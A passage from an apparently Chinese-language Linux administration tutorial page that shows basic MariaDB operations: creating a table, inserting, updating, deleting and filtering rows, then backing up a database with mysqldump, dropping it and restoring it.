class="comment">--------------------+</span></span><br><span class="line">| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| jaking&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.04</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8981;&#x60F3;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x5355;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5207;&#x6362;&#x5230;&#x67D0;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;&#x6BD4;&#x5982;&#x5728;&#x65B0;&#x5EFA;&#x7684;jaking&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x521B;&#x5EFA;&#x8868;&#x5355;mybook&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x8868;&#x5355;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x5373;&#x5B9A;&#x4E49;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x7684;&#x7ED3;&#x6784;&#x3002;&#x6211;&#x4EEC;&#x5206;&#x522B;&#x5B9A;&#x4E49;3&#x4E2A;&#x5B57;&#x6BB5;&#x9879;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;<strong>&#x957F;&#x5EA6;&#x4E3A;15&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x5B57;&#x7B26;&#x578B;&#x5B57;&#x6BB5;name&#x7528;&#x6765;&#x5B58;&#x653E;&#x56FE;&#x4E66;&#x540D;&#x79F0;</strong>&#xFF0C;&#x6574;&#x578B;&#x5B57;&#x6BB5;price&#x548C;pages&#x5206;&#x522B;&#x5B58;&#x50A8;&#x56FE;&#x4E66;&#x7684;&#x4EF7;&#x683C;&#x548C;&#x9875;&#x6570;&#x3002;&#x5F53;&#x6267;&#x884C;&#x5B8C;&#x4E0B;&#x8FF0;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8868;&#x5355;&#x7684;&#x7ED3;&#x6784;&#x4FE1;&#x606F;&#x4E86;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use jaking;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [jaking]&gt; CREATE TABLE mybook (name char(15),price int,pages int);</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">MariaDB [jaking]&gt; DESCRIBE mybook;</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">| Field | Type&#xA0;&#xA0;&#xA0;&#xA0; | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">| name&#xA0; | char(15) | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| price | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| pages | int(11)&#xA0; | YES&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0; | NULL&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">-------+----------+------+-----+---------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></tbody></table></figure><h2 id="5-&#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;"><a href="#5-&#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;" class="headerlink" title="5 &#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;"></a>5 &#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;</h2><p>&#x63A5;&#x4E0B;&#x6765;&#x5411;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x63D2;&#x4E00;&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x3002;&#x4E3A;&#x6B64;&#x9700;&#x8981;&#x4F7F;&#x7528;INSERT&#x547D;&#x4EE4;&#xFF0C;&#x5E76;&#x5728;&#x547D;&#x4EE4;&#x4E2D;&#x5199;&#x6E05;&#x8868;&#x5355;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x6BB5;&#x9879;&#x3002;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#x5373;&#x53EF;&#x5B8C;&#x6210;&#x56FE;&#x4E66;&#x5199;&#x5165;&#x4FE1;&#x606F;&#x3002;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x8BE5;&#x547D;&#x4EE4;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x4E2D;&#x4E66;&#x540D;&#x4E3A;jaking&#xFF0C;&#x4EF7;&#x683C;&#x548C;&#x9875;&#x6570;&#x5206;&#x522B;&#x662F;60&#x5143;&#x548C;518&#x9875;&#x3002;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x540E;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5199;&#x5165;&#x5230;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#x3002;&#x6211;&#x4EEC;&#x5728;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x60F3;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#xFF1B;&#x5982;&#x679C;&#x60F3;&#x67E5;&#x770B;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x661F;&#x53F7;&#xFF08;*&#xFF09;&#x901A;&#x914D;&#x7B26;&#x6765;&#x663E;&#x793A;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [jaking]&gt; INSERT INTO mybook(name,price,pages) VALUES(&apos;jaking&apos;,&apos;60&apos;, &apos;518&apos;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">MariaDB [jaking]&gt; select * from mybook;</span><br><span class="line">+<span class="comment">------------+-------+-------+</span></span><br><span class="line">| name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price | pages |</span><br><span class="line">+<span class="comment">------------+-------+-------+</span></span><br><span class="line">| jaking |&#xA0;&#xA0;&#xA0; 60 |&#xA0;&#xA0; 518 |</span><br><span class="line">+<span class="comment">------------+-------+-------+</span></span><br><span class="line">1 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x6765;&#x8BB2;&#xFF0C;&#x9700;&#x8981;&#x505A;&#x597D;&#x56DB;&#x95E8;&#x529F;&#x8BFE;&#x2014;&#x589E;&#x3001;&#x5220;&#x3001;&#x6539;&#x3001;&#x67E5;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x5355;&#x5E76;&#x5728;&#x5176;&#x4E2D;&#x63D2;&#x5165;&#x5185;&#x5BB9;&#x4EC5;&#x4EC5;&#x662F;&#x7B2C;&#x4E00;&#x6B65;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x638C;&#x63E1;&#x6570;&#x636E;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x7684;&#x4FEE;&#x6539;&#x65B9;&#x6CD5;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;update&#x547D;&#x4EE4;&#x5C06;&#x521A;&#x624D;&#x63D2;&#x5165;&#x7684;jaking&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x7684;&#x4EF7;&#x683C;&#x4FEE;&#x6539;&#x4E3A;55&#x5143;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x8BE5;&#x56FE;&#x4E66;&#x7684;&#x540D;&#x79F0;&#x548C;&#x5B9A;&#x4EF7;&#x4FE1;&#x606F;&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x53EA;&#x67E5;&#x770B;&#x56FE;&#x4E66;&#x7684;&#x540D;&#x79F0;&#x548C;&#x5B9A;&#x4EF7;&#xFF0C;&#x800C;&#x4E0D;&#x6D89;&#x53CA;&#x9875;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x987B;&#x518D;&#x7528;&#x661F;&#x53F7;&#x901A;&#x914D;&#x7B26;&#x6765;&#x663E;&#x793A;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x3002;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [jaking]&gt; UPDATE mybook SET price=55 ;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1&#xA0; Changed: 1&#xA0; Warnings: 0</span><br><span class="line">MariaDB [jaking]&gt; SELECT name,price FROM mybook;</span><br><span class="line">+<span class="comment">------------+-------+</span></span><br><span class="line">| name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price |</span><br><span class="line">+<span class="comment">------------+-------+</span></span><br><span class="line">| jaking |&#xA0;&#xA0;&#xA0; 55 |</span><br><span class="line">+<span class="comment">------------+-------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;delete&#x547D;&#x4EE4;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x4F7F;&#x7528;delete&#x547D;&#x4EE4;&#x5220;&#x9664;&#x6570;&#x636E;&#x8868;&#x5355;mybook&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x67E5;&#x770B;&#x8BE5;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8BE5;&#x8868;&#x5355;&#x5185;&#x5BB9;&#x4E3A;&#x7A7A;&#x4E86;&#x3002;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [jaking]&gt; DELETE FROM mybook;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">MariaDB [jaking]&gt; SELECT * FROM mybook;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x5355;&#x4E2D;&#x4F1A;&#x5B58;&#x653E;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x6761;&#x6570;&#x636E;&#x4FE1;&#x606F;&#x3002;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x521A;&#x521A;&#x521B;&#x5EFA;&#x7684;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x7684;mybook&#x8868;&#x5355;&#xFF0C;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x7684;&#x63A8;&#x79FB;&#xFF0C;&#x91CC;&#x9762;&#x7684;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x3002;&#x5728;&#x8FD9;&#x6837;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EA;&#x60F3;&#x67E5;&#x770B;&#x5176;&#x4EF7;&#x683C;&#x5927;&#x4E8E;&#x67D0;&#x4E2A;&#x6570;&#x503C;&#x7684;&#x56FE;&#x4E66;&#x65F6;&#xFF0C;&#x53C8;&#x8BE5;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x5462;&#xFF1F;<br>&#x4E0B;&#x9762;&#x5148;&#x4F7F;&#x7528;insert&#x63D2;&#x5165;&#x547D;&#x4EE4;&#x4F9D;&#x6B21;&#x63D2;&#x5165;4&#x6761;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking1&apos;</span>,<span class="string">&apos;30&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking2&apos;</span>,<span class="string">&apos;50&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking3&apos;</span>,<span class="string">&apos;80&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> mybook(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;jaking4&apos;</span>,<span class="string">&apos;100&apos;</span>,<span class="string">&apos;518&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p>&#x8981;&#x60F3;&#x8BA9;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x66F4;&#x52A0;&#x7CBE;&#x51C6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x7ED3;&#x5408;&#x4F7F;&#x7528;select&#x4E0E;where&#x547D;&#x4EE4;&#x4E86;&#x3002;&#x5176;&#x4E2D;&#xFF0C;where&#x547D;&#x4EE4;&#x662F;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x8FDB;&#x884C;&#x5339;&#x914D;&#x67E5;&#x8BE2;&#x7684;&#x6761;&#x4EF6;&#x547D;&#x4EE4;&#x3002;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4EC5;&#x67E5;&#x627E;&#x51FA;&#x7B26;&#x5408;&#x8BE5;&#x6761;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x3002;&#x8868;3&#x5217;&#x51FA;&#x4E86;where&#x547D;&#x4EE4;&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x67E5;&#x8BE2;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;&#x3002;</p><p>&#x8868;3. where&#x547D;&#x4EE4;&#x4E2D;&#x4F7F;&#x7528;&#x7684;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;</p><table><thead><tr><th>&#x53C2;&#x6570;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>=</td><td>&#x76F8;&#x7B49;</td></tr><tr><td>&lt;&gt; &#x6216; !=</td><td>&#x4E0D;&#x76F8;&#x7B49;</td></tr><tr><td>&gt;</td><td>&#x5927;&#x4E8E;</td></tr><tr><td>&lt;</td><td>&#x5C0F;&#x4E8E;</td></tr><tr><td>&gt;=</td><td>&#x5927;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;</td></tr><tr><td>&lt;=</td><td>&#x5C0F;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;</td></tr><tr><td>BETWEEN</td><td>&#x5728;&#x67D0;&#x4E2A;&#x8303;&#x56F4;&#x5185;</td></tr><tr><td>LIKE</td><td>&#x641C;&#x7D22;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;</td></tr><tr><td>IN</td><td>&#x5728;&#x5217;&#x4E2D;&#x641C;&#x7D22;&#x591A;&#x4E2A;&#x503C;</td></tr></tbody></table><p>&#x73B0;&#x5728;&#x8FDB;&#x5165;&#x52A8;&#x624B;&#x73AF;&#x8282;&#x3002;&#x5206;&#x522B;&#x5728;mybook&#x8868;&#x5355;&#x4E2D;&#x67E5;&#x627E;&#x51FA;&#x4EF7;&#x683C;&#x5927;&#x4E8E;75&#x5143;&#x6216;&#x4EF7;&#x683C;&#x4E0D;&#x7B49;&#x4E8E;80&#x5143;&#x7684;&#x56FE;&#x4E66;&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002;&#x5728;&#x719F;&#x6089;&#x4E86;&#x8FD9;&#x4E24;&#x4E2A;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x5C1D;&#x8BD5;&#x7CBE;&#x786E;&#x67E5;&#x627E;&#x56FE;&#x4E66;&#x540D;&#x4E3A;jaking2&#x7684;&#x56FE;&#x4E66;&#x4FE1;&#x606F;&#x3002;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [jaking]&gt; SELECT * FROM mybook WHERE price&gt;75;</span><br><span class="line">+<span class="comment">-------------+-------+-------+</span></span><br><span class="line">| name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price | pages |</span><br><span class="line">+<span class="comment">-------------+-------+-------+</span></span><br><span class="line">| jaking3 |&#xA0;&#xA0;&#xA0; 80 |&#xA0;&#xA0; 518 |</span><br><span class="line">| jaking4 |&#xA0;&#xA0; 100 |&#xA0;&#xA0; 518 |</span><br><span class="line">+<span class="comment">-------------+-------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.06</span> sec)</span><br><span class="line">MariaDB [jaking]&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> mybook <span class="keyword">WHERE</span> price!=<span class="number">80</span>;</span><br><span class="line">+<span class="comment">-------------+-------+-------+</span></span><br><span class="line">| name | price | pages&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------+-------+-------+</span></span><br><span class="line">| jaking1&#xA0; | 30&#xA0; | 518&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| jaking2&#xA0; | 50&#xA0; | 518&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| jaking4&#xA0; | 100 | 518&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------------+-------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line">MariaDB [mysql]&gt; <span class="keyword">exit</span></span><br><span class="line">Bye</span><br></pre></td></tr></tbody></table></figure><h2 id="6-&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;"><a href="#6-&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;" class="headerlink" title="6 &#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;"></a>6 &#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x53CA;&#x6062;&#x590D;</h2><p>&#x524D;&#x6587;&#x63D0;&#x5230;&#xFF0C;&#x672C;&#x4E66;&#x7684;&#x6280;&#x672F;&#x4E3B;&#x7EBF;&#x662F;Linux&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#x65B9;&#x5411;&#xFF0C;&#x4E0D;&#x4F1A;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x6DF1;&#x5165;&#x7684;&#x8BB2;&#x89E3;&#xFF0C;&#x56E0;&#x6B64;&#x5927;&#x5BB6;&#x638C;&#x63E1;&#x4E86;&#x4E0A;&#x9762;&#x8FD9;&#x4E9B;&#x57FA;&#x672C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#x5C31;&#x8DB3;&#x591F;&#x4E86;&#x3002;&#x4E0B;&#x9762;&#x8981;&#x8BB2;&#x89E3;&#x7684;&#x662F;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x4EE5;&#x53CA;&#x6062;&#x590D;&#xFF0C;&#x8FD9;&#x4E9B;&#x77E5;&#x8BC6;&#x6BD4;&#x8F83;&#x5B9E;&#x7528;&#xFF0C;&#x5E0C;&#x671B;&#x5927;&#x5BB6;&#x80FD;&#x591F;&#x638C;&#x63E1;&#x3002;<br>mysqldump&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;mysqldump [&#x53C2;&#x6570;] [&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;]&#x201D;&#x3002;&#x5176;&#x4E2D;&#x53C2;&#x6570;&#x4E0E;mysql&#x547D;&#x4EE4;&#x5927;&#x81F4;&#x76F8;&#x540C;&#xFF0C;-u&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8D26;&#x6237;&#x540D;&#x79F0;&#xFF0C;-p&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5BC6;&#x7801;&#x63D0;&#x793A;&#x7B26;&#x3002;&#x4E0B;&#x9762;&#x5C06;jaking&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x5BFC;&#x51FA;&#x6210;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4FDD;&#x5B58;&#x5230;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x5BB6;&#x76EE;&#x5F55;&#x4E2D;&#xFF1A;</p><pre><code>[root@jaking ~]# mysqldump -u root -p jaking &gt; /root/jakingDB.dumpEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;</code></pre><p>&#x7136;&#x540E;&#x8FDB;&#x5165;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x5F7B;&#x5E95;&#x5220;&#x9664;jaking&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x8FD9;&#x6837;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E5F;&#x5C06;&#x88AB;&#x5F7B;&#x5E95;&#x5220;&#x9664;&#x3002;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;jaking&#x6570;&#x636E;&#x5E93;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; DROP DATABASE jaking;</span><br><span class="line">Query OK, 1 row affected (0.04 sec)</span><br><span class="line">MariaDB [(none)]&gt; SHOW databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> jaking;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x63A5;&#x4E0B;&#x6765;&#x662F;&#x89C1;&#x8BC1;&#x6570;&#x636E;&#x6062;&#x590D;&#x6548;&#x679C;&#x7684;&#x65F6;&#x523B;&#xFF01;&#x4F7F;&#x7528;&#x8F93;&#x5165;&#x91CD;&#x5B9A;&#x5411;&#x7B26;&#x628A;&#x521A;&#x521A;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x5230;mysql&#x547D;&#x4EE4;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x767B;&#x5F55;&#x5230;MariaDB&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5C31;&#x53C8;&#x80FD;&#x770B;&#x5230;jaking&#x6570;&#x636E;&#x5E93;&#x4EE5;&#x53CA;mybook&#x6570;&#x636E;&#x8868;&#x5355;&#x4E86;&#x3002;&#x6570;&#x636E;&#x5E93;&#x6062;&#x590D;&#x6210;&#x529F;&#xFF01;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 